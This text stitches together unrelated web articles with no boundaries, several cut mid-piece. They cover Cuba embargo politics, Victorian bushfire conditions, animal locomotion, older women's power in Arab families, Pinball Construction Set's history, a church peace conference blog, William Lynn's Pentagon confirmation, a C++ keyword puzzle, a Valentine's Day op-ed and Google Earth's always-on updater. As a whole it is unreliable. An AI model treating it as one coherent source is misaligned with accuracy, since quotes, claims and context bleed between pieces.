" Remember , it was a Republican - controlled Senate that approved the sale of food and medicine to Cuba back in 2000 , so I do n’t think there is significant political risk . "
In the last several weeks , lawmakers , including Lugar in the Senate , have quietly introduced bills that , if passed , would lift all travel restrictions on trips to Cuba by U.S. citizens , a step that could inflict a decisive blow against the embargo .
Such legislation passed in both the House of Representatives and Senate in 2003 and 2004 but was dropped when Bush threatened to veto the bills .
Most congressional observers believe they are likely to pass again , over the strong objections of the hard - line anti-Castro lobby centered in south Florida and New Jersey , provided that Obama clearly signals his support .
" Much depends on the Obama ’s attitude , " said LeoGrande , who noted that the hard - liners had gained some influence with new Democratic , as well as right - wing Republican , lawmakers in recent years who have accepted campaign funding from the U.S. - Cuba Democracy PAC .
" If he were to say , ‘ It ’s time for a change ; I support efforts by Congress to end the travel ban , ’ that will give political cover to some who might be a little worried about their vote .
But if he says , ‘ I ’m just lifting restrictions for Cuban Americans and I ’m not in favor of going much further , ’ then nothing ’s going to happen . "
Obama is likely to get more encouragement from the business community , according to Jake Colvin , vice president of the National Foreign Trade Council ( NFTC ) , an association of several hundred of the large U.S. multi-national companies , which called after Obama ’s election for the " complete removal of all trade and travel restrictions on Cuba . "
Lugar ’s statement , he said , would be " very positive " for his constituency .
" He ’s been very helpful on unilateral - sanctions reform , but he ’s never been out front on Cuba .
This shows there ’s increasing interest on the part of new and important actors in the Congress . "
The staff report argued that U.S. interests have been harmed by efforts to isolate Cuba in several ways .
Not only has it failed to contribute to the island ’s democratization , but it has also created tensions with both Latin America and Europe , which have chosen a policy of engaging Havana .
The report recommended that Washington consider establishing a bipartisan commission to forge a new , multilateral strategy on Cuba with Latin America and the European Union .
Indeed , unless Obama moves to relax the embargo before the Trinidad summit , he could suffer political damage in Latin America , according to Erikson .
" Latin Americans are not going to view Obama as a change agent if he still has in place the Bush - imposed sanctions on Cuba by the summit , " he said .
( Inter Press Service )
FOR those close to the fires , the conditions could be best described as being similar to the fire - bombing that destroyed German cities such as Dresden in World War II .
A University of Melbourne senior lecturer in fire ecology and management , Kevin Tolhurst , said the radiant heat - the heat given off by the fires - would itself have been enough to kill .
" When it gets close , you have enormous radiation loads . "
The " survivability " distance of Saturday 's heat was about four times their height - a 35 - metre high fire would directly imperil those within 140 metres .
The body would get over - stressed , the core temperature would get too high and the metabolism would break down in those conditions .
He said bushfires produce their own volatile gases which in turn burn - and on a day as hot as Saturday , it does not take much for them to ignite .
Dr Tolhurst said people could be surrounded by a series of spot fires .
Breathing would become difficult due to burning gases and the body would dehydrate quickly .
Death from a form of asphyxiation was also possible .
He said the fires were slightly different from those on Ash Wednesday , when they moved more quickly .
Hotter temperatures on Saturday meant the fire was even more intense and areas caught alight more easily .
Combined with the speed of the fires generated by the volatile winds , it would have left many people with little time to respond .
A Monash University associate professor , Jason Beringer , said the meteorological conditions on Saturday were second in severity only to Black Friday , the fires that devastated Victoria in 1939 .
But he thinks the fires could have been even worse .
He said it was likely most of Saturday 's fires were either deliberately lit or accidentally started by people , rather than by lightning .
Professor Beringer said the State Government had done a good job preparing for bushfires but the conditions on Saturday were too extreme .
Locomotion is a fascinating thing .
Though we typically only think about swimming , walking or flying , there are over 30 different documented types of animal locomotion .
From slithering snakes to rolling armadillos to moon - walking inch worms , check out these strange and fascinating facts about animal movement .
The Annoyingly Versatile Vampire Bat
( Image via Cornell )
Hi !
We heard there was blood ?
The vampire bat not only sucks blood , possesses infallible echolocation skills and flies better than most stealth bombers – it can walk .
Make that run .
As in sprint across a field almost as fast as you .
This really , er , sucks for the cattle of South America , who have a hard enough time as it is without worrying about indigenous vampire bats running up and biting their ankles .
( Bats are also the only mammals that can fly . )
Squirrels and Their Freaky Cousins
( Image via University of New Hampshire )
Squirrels have astonishing agility .
They can run wires , hop branches and dangle from swinging tree limbs without a second thought .
They can also walk upside down – upwards and downwards on a tree trunk – with equal speed thanks to their 180 degree rotating ankle sockets .
Flying squirrels , a related species to the common rat - with - fluffier - tail seen at picnics across America , can actually “ fly ” up to several feet thanks to specialized built - in wing suits of skin .
They See Me Rollin ’ , They Hatin ’

Armadillos are n’t the only creatures who rely on gravity to get the ball rolling .
Namib wheeling spiders , pangolins and web - toed salamanders also make use of stop , drop , and roll .
Now that ’s ninja .
The wheeling spider prefers to roll down sand dunes to escape predators , while pangolins and armadillos typically ball up to avoid snakes .
( Shown : a tightly wound pangolin .
Chill , dude , it ’s just a photographer . )
Water Striders and the Jesus Christ Lizard
Walking on water is something no human has managed to do , but plenty of insects and lizards seem to possess the power .
The water strider is the ant of the water - walking world , able to jump and skid on water while holding 15 times its weight , without sinking .
The aptly named Jesus Christ lizard easily races along the water , as seen in this video .
Private Jets
Both the squid and the octopus move via jet propulsion , which is pretty awesome .
The octopus is especially gifted – not only can it propel itself , it can move around via its chimpanzee - strength tentacles that come complete with suckers ( which we ’re pretty sure would never slip off the shower wall ) .
It can also change color , shape , size ( even at 600 pounds , like the octopus in the video above ) and , of course , shoot blinding ink to make a fast escape .
Sometimes they do n’t take kindly to being bothered , as you can see in the footage above of a giant squid attacking a camera .
Squid and octopi are exceptionally intelligent , sensitive creatures , and some believe they are more intelligent than dolphins , perhaps even possessing a concept of grammar .
You might think twice at the sushi bar .
Bears , Giraffes and Camels , Oh My !
( Image via camelphotos )
Some animals , such as bears , giraffes , and camels , actually have a different gait and stride than most .
They move the same two legs on each side in alternate steps , 1 , 3 , 2 , 4 , rather than the 1 , 4 , 2 , 3 pattern of most mammals and nearly all ungulates ( such as horses , goats , sheep and bison ) .
It makes for a bit of an awkward pace , but they can generally run very swiftly .
Horses , of course , can be taught to walk this way .
Humans
Humans are rare among mammals because we are bipedal ( we walk upright on our two feet ) , although sometimes it does n’t work out too well , such as when we insist on wearing 5 ″ heels .
Bipedalism might feel natural to us , but in fact it ’s a specialized adaptation that is rather difficult compared to walking on all fours – no wonder most apes and monkeys avoid it .
( It also explains our prevalent lower back pain . )
When other simians go bipedal , they still tend to keep their chests close to the ground and bend their knees sharply .
Kangaroos and some rodents are bipedal , but they hop rather than walk .
We do n’t hop because it would consume too many calories .
Congratulations , humanity : bipedalism is hard work , and you ’re awesome at it !
Well , except for giant birds like ostrich , penguins and emus – their wings are n’t nearly strong enough to make flight possible , so they walk and run just like humans .
The kiwi does n’t really have an excuse , but they ’re very angry little birds , so do n’t ask them why they do n’t fly .
I ’m In Ur Nature , Flexin My Gunz

Whether it ’s the brachiation ( movement by swinging of arms a la Tarzan ) of monkeys and apes or the dragging oneself along by the shoulders like many seals , quite a few animals prefer to use their muscular arms for movement instead of their relatively undeveloped legs .
Wings and flippers and fins are all evolutionarily related to arms and hands , of course .
If you consider brachiation , flight , and swimming from a broader evolutionary view , most animals rely on their “ arms ” , from birds to whales to sea lions to fish .
Inchworm … Still Gets Eaten
( Image via dicts )
The adorable inchworm is really the caterpillar of the geometer moth .
If you have ever experienced the childlike delight of discovering an inchworm , you know how fun they are to watch .
Unfortunately their odd movement catches the eye of many a bird , but enough survive each season to reach adulthood nevertheless .
On a recent trip back to Sudan and Saudi Arabia to visit family , all my paternal uncles came to visit me .
In Arab cultural tradition , they became my guardians when my father died – even though I now spend most of my time in London .
As we met , I braced myself for awkward questions about the " impropriety " of living away from home and what would surely be the inevitable demand that I return .
In fact , none of these were forthcoming .
My uncles were polite and even a little curious about the nature of my work .
Feeling that I had perhaps underestimated them , I breathed a sigh of relief , but then one of my paternal aunts appeared and said , unflinchingly and with an unsettlingly full sense of entitlement , " So , when are you coming back ? "
I stumbled in my response and looked to my mother , but she offered no support .
" Yes Nesrine , when ? "
As a younger Arab / African woman growing up in a large traditional family , I always felt sympathy for my older female relatives .
I saw them as victims , like the broken - winged Amina in the Cairo Trilogy , banished to her mother 's house for daring to leave her marital home to pray in the mosque without her husband 's permission .
If the women in my family were ever mean - spirited , bitter or excessively voyeuristic – relishing scandal – I attributed this to their unhappiness and lack of fulfilment .
It seemed to me ironic that there was such a romantic view of women , particularly mothers , in Arab and African culture .
When the Prophet Muhammad was asked " Where do you find paradise ? " he reportedly answered : " Paradise lies at the feet of mothers . "
In another famous hadith , frequently cited to rebut claims that Islam is inherently chauvinist , the prophet answers the question , " Who among my kinfolk is worthy of my good companionship ? "
He replies , " Your mother " three times before saying , " Your father . "
As I grew older and became more familiar with the world of women , I saw the men in my family as less and less the petty female - obsessed guardians of the status quo and more like its final enforcers .
When my Sudanese female cousin recently wed a white Canadian , the women of the family were whispering nastily on the wedding night at how the standards of the family had fallen , while the men maintained silence in the face of a fait accompli .
The mothers , aunts and grandmothers mocked or criticised the men's silence behind their backs and saw themselves as the family 's moral foundations , with the men wielding only material and physical power .
I began to see that women were not the devoid - of - volition players I once thought they were .
In fact , the most dominant forces in the subjugation of women appeared to be the older and more established women .
While it is relatively easy for girls to build up the reserves of energy to confront emotionally distant fathers , uncles and other men in their lives , it is difficult to oppose female relatives , especially mothers who are in principle on your side , but in family politics are actually aligned elsewhere .
When I was at school , it was not our fathers we feared when we were up to no good , but our mothers who were acutely attuned to those telltale changes in behaviour that only a mother can spot .
This soft , tactile power is subtle .
If men are the brute enforcers , mothers are the thought police , patrolling their daughter 's mind , while other female relatives alert her to anything she might have missed .
Cue the ubiquitous , fussy , interfering Auntie - ji character – matchmaking and meddling .
While they may not be quite the kind who carry around photo albums of potential husbands ( prevalent in Punjabi society ) they still abound in Arab families .
A veritable Rolodex of social networks , suitors and pithy one - liners ( my own bete noire 's favourite saying is " If you do n't have what you like , then like what you have " ) , they are specialists in character assassination , deflating your achievements and , most infuriatingly , pressurising your mother just when you had talked her into talking your father round .
This goes beyond the pervasive fear that someone , somewhere – younger , of course – might be having fun .
In my experience at least , even fulfilled and apparently liberal - minded women seem to bristle at younger ones challenging the status quo , or more precisely , challenging more of the status quo than they had done , stripping them of whatever forward - thinking uniqueness they imagined they had .
A relative of mine , who became a pioneer in the 1970s by studying at a university in the US , was one of the main objectors to my studying in London , on the grounds that when she did it she was with a mahram ( male guardian ) .
The crossover point seems to be marriage .
The happily unmarried woman is treated like an off - road vehicle that may damage and challenge the tidy spaces of married women who have arrived and finally inherited some role of authority , some credibility that they so painfully lacked when single .
While this smug Bridget Jones divide may not be unique to more traditional societies , it further reinforces a barrier to female emancipation , a frontier that is less tangible , less exposed in the media and much more emotionally challenging .
An old lady teaches a bunch of ridge - headed Klingons in the spoof video Klingon Night School ( embedded ) .
Elsie Roy , who calls the Klingon language " poetic , " preps her extraterrestrial charges for life outside the classroom in director Gord McWatters ’ short video .
Definitely worth a look , if only to see a couple of Klingons sneaking a smoke .

[ Gamasutra presents its second exclusive web - only bonus chapter from Bill Loguidice and Matt Barton 's forthcoming book Vintage Games : An Insider Look at the History of Grand Theft Auto , Super Mario , and the Most Influential Games of All Time .
Here , the duo presents a history of Pinball Construction Set , one of the earliest and most accessible examples of a game that engenders user - created content . ]
In 1981 , when it was still possible to sell commercial computer games in plastic baggies , [ 1 ] Bill Budge released his latest game , Raster Blaster , for the Apple II .
It was published through his own company , BudgeCo Inc. , a cooperative venture formed with his sister .
Raster Blaster was a fast - paced , single - screen pinball game inspired by Williams 's Firepower pinball machine .
Although Raster Blaster was a critical and commercial success , its greatest claim to fame was that it provided Budge with the experience necessary to develop his legendary follow - up , Pinball Construction Set ( PCS ) , subtitled " A video construction set from BudgeCo " .
BudgeCo's Raster Blaster .
Right up to the early 1980s , commercial computer software often came in plastic baggies or small cardboard folders .
Note the expanded contents from the zipper storage bag of subLOGIC 's configurable Pinball ( also known as Night Mission Pinball , 1982 ) game from Bruce Artwick of Flight Simulator fame .
The small cardboard folder included with the disk describes the game well : " The Pinball Construction Set contains the pieces and tools to make millions of hi-res video pinball games .
No programming or typing is necessary .
Just take parts from the set and put them on the game board .
Press a button to play !
Use the video tools to make borders and obstacles .
Add game logic and scoring rules with the wiring kit .
Create hi-res designs and logos using the BudgeCo magnifier .
Color your designs with the paint brush . "
The fact that Budge 's own Raster Blaster could be recreated and even surpassed with PCS was enticing to anyone who had dreamed of making a virtual pinball game .
Exciting stuff even today , it was downright groundbreaking in 1982 -- particularly considering that the Apple II had just 48 K of RAM .
Partial scan of the exterior folder from BudgeCo 's original release of Pinball Construction Set , featuring a very literal cover design .
Although PCS was another critical and commercial success for BudgeCo , Budge and his sister were soon overwhelmed with the demands of running a software publishing business in an increasingly sophisticated and competitive marketplace .
Budge agreed to work with Trip Hawkins and his fledgling startup , Electronic Arts ( EA ) , whose goal at the time was to promote the idea of developer as " software artist " ( or superstar ) , while at the same time presenting computer games in attractive , professional packaging .
Computer games had remained on the margins of popular culture , and Hawkins 's goal was not just to sell his own games but to sell gaming as a worthwhile medium .
Thus , in 1983 , Electronic Arts published Pinball Construction
Set in the company 's iconic record album - style packaging with slick cover art , complete with a greatly expanded ( though arguably superfluous ) instruction manual .
The game was eventually ported to the Apple Macintosh , Atari 8 - bit , Coleco Adam , [ 2 ] Commodore 64 , and PC .
It was a big success for EA and instrumental in establishing the publisher 's reputation for quality products .

At Thursday morning ’s program ( Jan. 15 , 2009 ) , attendance was down significantly from yesterday .
Is it just me , or could the smiling positive pietism be wearing on the patience of many ?
The morning ’s panel , entitled “ Speak Truth to Power , ” was another “ surprise ” lineup , not identified until we showed up .
Yet in fact it was utterly predictable , made up of church lobbyists , all based in Washington .
Individually they were all fine , articulate , dedicated people .
Yet they reminded me of a rule of thumb of mine , which is to question whether it is a worthwhile investment of time , expense or energy resources to travel many hours to a gathering , the bottom line of which is being told to write to Congress .
Folks , without getting up from my chair , I am told that daily , again and again .
To drive 500 miles to hear it several more times is beyond repetitive , it is tedious and patronizing .
Yes these are good groups ; but life is short – tell us something we do n’t already know , and have n’t heard a hundred times before .
I had imagined ( but not expected ) a different kind of panel : one featuring several activists who are involved in lively , active , church - based programs far from Washington , but having impact there and in other circles of “ power . ”
The Bronx youth program described Wednesday by Alexie Torres Fleming , which was all new to me , would be a prime example .
There are several other such vibrant projects whose activist staff are represented here , who have had and are unlikely to get any such visibility .
Imagination , however , has not been a strong point of the program .
Thursday evening opened with a reading of the event ’s Epistle , which has been mentioned previously .
It was read to us , and we were told to write responses to it right that minute , on little cards which were then collected .
Before the reading we were also advised that ( for reasons which I ’m hazy about ) the text would not include specifics or name names .
This proscription applied not only to the names of persons , but to many other nouns , such as , for instance , “ war , ” “ violence , ” or militarism . ”
However , without the burden of specifics , the text unwittingly took on a load of ambiguity , which got heavier as I listened .
In fact , toward the end , I got an eerie feeling that I had read or heard many similar expressions , not in church documents , but in military texts and prayers .
( Yes they exist ; oh brother , do they . )
That is , it turns out that much or most of what was read to us in this virtually content - free text could have been endorsed by the most militant war - fighter on Fort Bragg .
Permit me a few examples :
Draft epistle ( DE ) : “ We believe this is a time when peace can happen , if we will heed God ’s call . . . . ”
Military : “ Peace Is Our Profession . ” ( Motto of the Strategic Air Command – the nuclear bomber fleet ) during the years I was growing up on Air Force bases .
DE : ‘ We discovered afresh the call of the scriptures to partner with God in walking with people at risk . ”
Military : “ De oppresso Liber ” “ To liberate the oppressed . ” Motto of the US Special Forces .
DE : “ We recognize that not everyone wants God ’s way of peace .
The cost is high .
The life of Jesus demonstrated the loss of security , transformation , suffering , and dying .
. . .
Let us be bold .
In the face of so many terrors , let us fight off disillusion .
The Holy Spirit must rise up in you and me to set all people free . ”
Military : “ Almighty GOD , Who art the Author of Liberty and the Champion of the Oppressed , hear our prayer .
We , the men of Special Forces , acknowledge our dependence upon
Thee in the preservation of human freedom .
Go with us as we seek to defend the defenseless and to free the enslaved .
. . .
It is for Thee that we do battle , and to Thee belongs the victor ’s crown . ” ( Special Forces Prayer . )
“ I know that I will be called upon to perform tasks in isolation , far from familiar faces and voices , with the help and guidance of my God . ” ( From the Special Forces Creed . )
Two late additions : “ People want to live in peace ; they want to grow up in a peaceful environment .
And the decision I made is going to help the Iraqi government do that . ”
Outgoing US president , February 14 , 2007 .
“ Freeing people from oppression and despair is eternally right .
This nation must continue to speak out for justice and truth .
We must always be willing to act in their defense — and to advance the cause of peace . ”
Outgoing president , farewell speech , January 15 , 2009
And so forth .
To be sure , there are other , more warlike passages in the documents quoted .
But the point is that the DE ’s carefully non-specific talk of God , sacrifice , the oppressed , risk etc. , could be folded into them and not be noticed , except possibly for the single mention of “ nonviolent direct action . ”
My suspicion is that the authors of the DE have little or no inkling of what ’s described here .
And I also suspect this is an indication that among the plannners and presenters there is very little direct familiarity with the military , the wars that it makes in the name of peace , or the extensive religious justifications of such wars as God ’s will , America ’s divinely - ordained mission , and the path for true followers of Jesus .
I am not the first to point out this huge cultural gap ; the book AWOL does it in convincing detail .
But the book does not make the point that such innocence fails to serve the work of religious peacemaking , indeed sharply limits its potential .
So let me make it , loud and clear .
One hopes that the revised text to be delivered Friday will manage to acquire a modicum of specificity , at least enough so that there is some recognizable space between it and frankly more military texts and prayers .
To that end , here is a proposed list of nouns that might be worked into it :
war ; violence ; militarism ; military industrial complex ; torture ; Iraq ; Afghanistan ; Gaza ; Christian Zionism ; soldiers ; wounded ; casualties ; imperialism . . .
You are invited to add more .
And by the way – there has been much talk this week , and in particular today , about Dr. Martin Luther King Jr. and his legacy .
It ’s worth noting here that at Fort Bragg , near where I live at Quaker House , they too have annual ceremonies to remember Dr. King .
Are they the “ wrong ” kind of commemorations ?
Maybe .
But let us remember – does anyone here ? – that the US military was racially desegrated well ahead of the rest of US society .
And looking ahead .
Tomorrow we are supposed to be given opportunities to join “ focus groups ” on topics selected from brief discussions after the epistle Thursday night .
To have such specificity delayed until the conference ’s last day seems to me very strange and unhelpful ; bass - ackward as they say in North Carolina .
Oh well .
I ’m hoping for one on torture and accountability .
That ’s an awfully specific , and potentially non-positive subject compared to the pablum we ’ve been fed .
Let ’s see if it happens .
WASHINGTON ( Reuters ) - The U.S. Senate approved William Lynn , a former Raytheon
Co lobbyist , to be deputy secretary of defense after he received a special White House waiver from strict new rules meant to close a “ revolving door ” between government and big business .
Lynn , the Pentagon ’s chief financial officer from November 1997 to January 2001 under former President Bill Clinton , was confirmed by a vote of 93 to 4 on Wednesday .
At Raytheon , the world ’s biggest missile - maker and the Pentagon ’s No. 6 supplier by sales , he was registered as the company ’s top lobbyist to the Defense Department from July 2002 until last year .
President Barack Obama ’s new ethics rules bar lobbyists for two years from working as appointees on matters they had lobbied about .
The White House Office of Management and Budget gave Lynn a waiver to further “ the public interest . ”
Sen .
Charles Grassley , an Iowa Republican noted for holding federal officials to account , deplored Lynn ’s nomination in a floor speech before the vote .
“ I think the Office of Government Ethics will have to set up a full - time department just to handle Mr. Lynn ’s conflicts - of - interest Raytheon waivers , ” said Grassley , who voted against confirmation .
Lynn has said he will steer clear for a year of decisions involving six big arms programs on which he lobbied on behalf of Raytheon .
They are the DDG - 1000 multi-mission combat ship , Advanced Medium - Range Air - to - Air missile , F - 15 airborne radar , Patriot missile “ Pure Fleet ” modernization , the National Reconnaissance Office ’s Future Imagery Architecture , and the Missile Defense Agency ’s Multiple Kill Vehicle .
Read the Diffs
Do you work as part of a software team ?
Here 's a piece of advice for you :
Read the diffs .
Every morning before you start your own coding tasks , use your favorite diff tool to look at all the changes that everybody else checked in the day before .
There is a reasonable chance that this advice is worth exactly how much you paid me for it . :-)
Still , many of the best developers I have known do make this their habit .
Reading the diffs is very likely to produce two benefits :
The code might get better .
Reading the diffs is like an informal code review .
You might find something that needs to be fixed .
You might learn something .
Maybe one of your coworkers is using a technique you do n't know about .
Or maybe reading the diffs simply gives you a deeper understanding of the project you are working on .
Of course , use some common sense about whether this habit is practical in your situation .
For example , if you work on a team of a thousand developers , this probably wo n't work well for you .
Then again , I assume if you work on a team of a thousand developers , almost nothing works well for you , so this habit might fit right in . :-)
When General Motors and Chrysler asked Washington for more money last week they took very different approaches .
In exchange for an extra $ 17 billion from taxpayers  on top of the $ 13 billion it had gotten since December  G.M. said it would reduce costs by shuttering plants , cutting brands and slashing 47,000 jobs , about a fifth of its remaining work force .
For its $ 5.3 billion  on top of the $ 4.3 billion it has received since December  Chrysler offered little more than an assurance that it has already cut costs and accomplished most of what it had to do to become a valuable , viable company .
It offered to trim production by a paltry 100,000 units  leaving it with capacity to make almost one million vehicles more than it will sell this year  on the questionable assumption that demand , and its market share , will bounce back next year .
Chrysler said the only reason it was back asking for more money so soon was that the car market was worse than it had expected two months ago .
This cavalier approach to the public purse raises a very big question .
If Chrysler is really on track for a turnaround and all it needs is some financing to get over a bad patch in sales and debt markets , why does n’t Cerberus Capital Management , which owns 80 percent of the company , put up the money itself ?
Why should taxpayers have to take the risk ?
That ’s what private equity funds like Cerberus are supposed to do .
woah - why is this particularly an issue with clear tubing ?
I have a greywater system with some clear tubing , this did not occur to me either .
I bought it only because that was all they had at the store I went to .
Yes , very nice instructable .
I really like how you tipped the barrels to take advantage of the built in threading - this is a particularly sore point with me , I would love to see an instructable on how to install leakproof spigots on a curved surface .
I have a method , which I will soon be posting , but I 'm still waiting to see if it holds - want to see what others have been trying .
E xercise 15.8
Write a standards - conforming C++ program containing a sequence of at least ten different consecutive keywords not separated by identifiers , operators , punctutation characters , etc .
O ne way of interpreting this question is to say that alternative tokens such as bit_or are keywords .
If we could in addition repeat such tokens , you would quickly come up with arbitrarily long sequences of keywords : int main ( ) {
bool result = true and true and true
and true and not false ;
} M any may consider this cheating either on the grounds that a keyword is being repeated or that it is in fact not a keyword but an " alternative token " ( the distinction is thin however , and you will note that Bjarne treats such tokens as keywords in par .
A.2. )
Another , perhaps more obscure , repeatable keyword ( not an alternative token this time ! ) is sizeof : int main ( ) {
return sizeof sizeof sizeof sizeof
sizeof sizeof sizeof sizeof true ;
} C oming up with an uninterrupted sequence of distinct , honest - to - goodness keywords is a little harder .
A good way to start is to stare at the table of all keywords ( see e.g. par. A.2 in Bjarne 's book ) .
The most interesting candidate keywords are those that are not required to be surrounded by punctuation : const ( par. 5.4 ) , inline ( par. 7.1.1 ) and new ( par 6.2.6 ) could potentially be useful .
On the other hand static_cast ( par. 6.2.7 ) or private ( par. 15.3 ) are less flexible because they are always followed by a non-keyword token (' < ' and ' : ' respectively . )
Declarations can have a fair number of keywords .
Here is a good starting point : signed long int const volatile a ; Maybe I hear you say " You can add extern to that " ( par. 9.2 ) or perhaps " Make it the return - type of a function and add qualifiers " ?
Good idea : extern inline signed long int const volatile f( ) ;
Ah , and we could explicitly instantiate a template ( par. C.13.10 ) ... and it could be an operator ( chap. 11 ) : template
extern inline signed long int const volatile operator *( X& ) ; Nine keywords ... very close ...
In fact , if you allow " alternative tokens " , you can have ten !
template
extern inline signed long int const volatile
operator and ( X& , Y& ) ; S o , mission accomplished as far as the spirit of the exercise goes , but for brainteasing 's sake , let 's look for a solution not involving alternative tokens .
Some expressions can contain little pieces of declaration - like items ( types ) .
The typeid ( par. 15.4.4 ) and sizeof ( par. 4.6 ) operators are like that , but they require parentheses .
The new operator ( par. 6.2.6 ) does not have that restriction , so that is useful .
Remember also that the sizeof operator does n't require parentheses either if its argument is an expression instead of a type .
Combining the two , we get : sizeof new signed long int const volatile ( ) ;
Seven only , but the expression can be grown with the throw operator ( par. 8.3.1 ) , so we are eight !
After that it may not be possible to grow the expression anymore , but some statements ( par. 6.3 ) have keywords that are followed by expressions without intervening punctuation .
If you look closely at the table in par .
6.3 of The C++ Programming Language , you will find that the do and else keywords are like that .
So our final answer is : int main ( ) {
if ( false ) {
} else do
throw sizeof new signed long int const volatile ( ) ;
while ( false ) ;
} C learly , this is not very useful code and indeed it is fair to say that useful code will never need to have ten consecutive distinct keywords in C ++.
However , this is a great bit of trivia to impress your friends and / or colleagues , and coming up with the solution got me to explore the C++ grammar in some more detail .
Ah yes , and you cannot do this in C ;-)
F inally , we should mention the following clever trick sent in by “ Prince Vijay Daniel ” : # define keywords this unsigned class struct \
enum template if for namespace else do return \
throw sizeof new signed long
We could list all the C++ keywords this way .
However , we should also note that identifiers only become keywords after preprocessing , and therefore this latter solution does not quite fit the spirit of the exercise .
M any Thanks to Bjarne Stroustrup , Andrew Koenig and “ Gargantua Blargg ” for their suggestions and corrections .
T he eleven distinct wholesome keywords challenge has been solved .
“ Gargantua Blargg ” not only came up with that answer , but also shows how you can have twenty ( yes , 20 ) different " extended " keywords placed in a valid C++ sequence ( " extended " meaning that alternative tokens are included . )
And Anatoli Tubman upped that to 24 keywords ...
So now the new challenge is for twelve classic keywords or 25 extended keywords .

Roland S. Martin says he does n't buy all the hype associated with Valentine 's Day .
( CNN ) --
With retailers hurting and the U.S. president trying to encourage Americans to spend money to restore consumer confidence , what I 'm about to say may seem like treason .
But here goes :
Please boycott Valentine 's Day and all that is associated with this horrendous " holiday . "
For several years I have ripped into Valentine 's Day .
Not because I 'm against love and relationships , but mainly because the holiday is such a farce .
First of all , Valentine 's Day is not built around a religious event like Christmas or Easter ; nor does it have any special meaning to the nation such as Memorial Day or Veterans Day .
It is nothing more than a commercial holiday created by rabid retailers who needed a major shopping day between Christmas and Easter in order to give people a reason to spend money .
Now folks , I love my wife .
She is truly an awesome woman who is smart , talented , fine , and , did I say fine ?
But do I really need a special day to show my affection for her ?
I 've long maintained that if I sent my flowers at other times during the year , why do I have to fall victim to peer pressure and send her some roses that have quadrupled in price leading up to February 14 ?
Why should I be inundated with mailings , e-mails and commercials to show her that I love her by buying jewelry or clothing ?
If we went shopping in June or September or last month , can I get some kind of waiver or " Get out of Valentine 's Day " card ?
As for this silly flower thing , it 's even got to the point that any flowers can't do .
Some years ago I planned on sending a woman some flowers that were n't roses , and the ( female ) co-workers were aghast .
They felt that nothing mattered except roses .
First of all , I did n't have a lot of dough and felt a nice bouquet was sufficient , but they were appalled .
So I told them to go to hell and I 'll do what I want .
I guess for them , the thought really does n't matter .
Then there are the women on the job who measure the love of their men based on those flowers .
You know how some folks are .
If there are flowers on the desk of 10 other women , and one woman does n't have anything , folks get to talking and whispering as if something is wrong in her relationship .
I 've learned that even if you get the biggest - ever rose bouquet -- the relationship might be crumbling and you just refuse to admit it .
And Valentine 's
Day really is n't even a two - way street .
Men are utterly irrelevant except to serve as pawns in this commercial game , emptying their wallets in order to satisfy their lovers or those around them .
Oh yea , retailers know the con game .
Most of these guys are hapless saps who have ignored their wives or girlfriends all year , so they buy the flowers and candy , and set a reservation at one of the city 's most expensive restaurants , all to say , " Honey , I love you . "
Ladies , and men , stop it !
It 's time to say enough is enough with Valentine 's Day .
What do I want ?
How about men and women loving , caring and sharing the other 364 days a year ?
February 14 is n't the only time to send flowers to your woman ( ladies , we would n't mind getting a surprise delivery as well ! ) .
How about dropping her a flower arrangement on May 14 ?
And on that card you need to write , " Just because ... "
Instead of men and women spicing up their sex life on February 14 , make the effort to satisfy your mate the rest of the year .
If last Valentine 's Day was the last time you took your significant other out to a really nice restaurant , you deserve to be in trouble .
Are you planning to treat your man or woman to a wonderful day at the spa this Saturday ?
Well , I 'm sure he or she would thoroughly enjoy the same in June or July .
It 's time that we all take stock of our relationships and learn that we are to be loving and fulfilled 365 days a year , and not reduce our affection to flowers , candy , jewelry , clothes and a meal on one day a year .
The people who plan their lives around Valentine 's are like those who spend more time planning their wedding day rather than planning their marriage .
The day is nice and wonderful , but what makes it last is what you do on the " non-special " days .

Before Butch Vig Gives the Finger While Producing Green Day ’s Next Album
The recently released desktop app Google Earth 5 contained a little surprise for many Mac OS X users — it installed Google 's automated Update Engine without clearly asking .
Worse , the latest version of Google Earth wo n't work without the Update Engine running in the background .
We mentioned the new update policy in our initial review , but given Google 's lack of transparency , or what users perceive as a lack of transparency about the update , it bears a closer look .
Sneaking an auto - updater into a software package without clearly pointing it out during the installation process is a bad idea , one that Google has promised to change with a new , more informative splash screen .
But , offering no way to turn the update software off is downright evil , according to many upset users in the Google Earth Group .
Most of us have dozens of applications installed on our PCs , many of which check for updates when the application is active .
So why does the Google Updater have to run all the time in the background ?
Wil Shipley , a longtime Mac developer and author of the award - winning Delicious Library , says , " This is a classic case of designing like a computer scientist instead of like a user : ' Well , it seems cleaner architecturally for us to have a central update server , instead of the same update module in each program the user runs ! ' "
Shipley goes on to point out that " anything running in the background is a potential security risk . "
Shipley 's own Delicious Library checks for updates when it launches , a system he calls " ideal . "
A spokesperson for software maker Adobe confirmed the company 's Creative Suite 4 also has no need for an always - running updater .
Instead , Adobe 's apps rely on a standalone updater that runs each time you launch one of the Creative Suite applications , like Photoshop or Illustrator .
Google is relatively new to the desktop software game , particularly the Mac side .
And , despite plenty of best practice examples from those who came before , the company is repeating the same amateur mistakes that most desktop software makers have long since abandoned .
Here are a few reasons why an always - active daemon ( software speak for a tiny app that runs in the background ) for handling software updates is a bad idea :
It opens up an always - on tunnel to Google .
While Google may be confident its update servers will never be compromised , how confident are you ?
If a third party gains control of that server , it can inject nearly any code it wants into your machine .
It ’s always on , always looking for update .
On an expensive , pay - by - the - megabyte EVDO network ?
Google Updater does n’t care and will suck down any available updates without asking , costing you money .
Google updates Google Earth or Picasa or Gtalk , but the update ends up having a bug that wipes data from your drive .
Sorry , too late — the auto - updater already grabbed the latest version without asking .
Kiss your data goodbye .
Administering a large network that needs to be locked down and tightly controlled ?
Cross Google software off your list .
All the above problems apply , but they 're cascaded across your network for added headaches .
A Google spokesperson defended the Updater with a canned response , stating that " updates provide bug fixes , fix security vulnerabilities , ensure that applications are still compatible with other software updates . "
But as Shipley says , " it 's incredibly intrusive to have some idiotic daemon whose whole purpose is just to look for updates . "
Comparing it to the real world , Shipley says an always - running background app is " like having a person at your company whose full - time job is to see if there 's , like , a new version of QuickBooks out yet . "
There 's an easy fix for this controversy : Just follow the standard best practices of desktop software .
Have your updater check in with the server at each launch .
It works for Microsoft , it works for Apple , it works for Adobe , it works for nearly every software maker on the market .
The audience of offended users may be small in the case of Google Earth , but it 's safe to assume that a Mac version of Google 's Chrome Browser will likely use the same update policy and that could hurt the browser ’s ability to entice users into switching .
